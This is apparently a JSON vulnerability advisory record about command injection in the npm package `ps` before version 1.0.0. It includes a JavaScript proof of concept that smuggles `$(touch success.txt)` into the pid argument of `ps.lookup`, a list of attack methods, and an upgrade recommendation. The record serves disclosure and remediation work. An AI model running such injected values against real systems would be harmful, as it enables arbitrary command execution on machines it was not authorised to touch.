{"description": "Versions of `ps` before 1.0.0 are vulnerable to command injection.\n\n### Proof of concept:\n```js\nvar ps = require('ps');\n\nps.lookup({ pid: \"$(touch success.txt)\" }, function(err, proc) { // this method is vulnerable to command injection\n    if (err) {throw err;}\n    if (proc) {\n        console.log(proc);  // Process name, something like \"node\" or \"bash\"\n    } else {\n        console.log('No such process');\n    }\n});\n\n// Result: The file success.txt will exist on the filesystem if the touch command was executed\n```\n\n\n## Recommendation\n\nUpdate to version 1.0.0 or later.", "methods": ["Used command injection to execute arbitrary commands.", "Used a vulnerable version of the `ps` module to execute system commands.", "Created a file on the filesystem to demonstrate command injection."]}
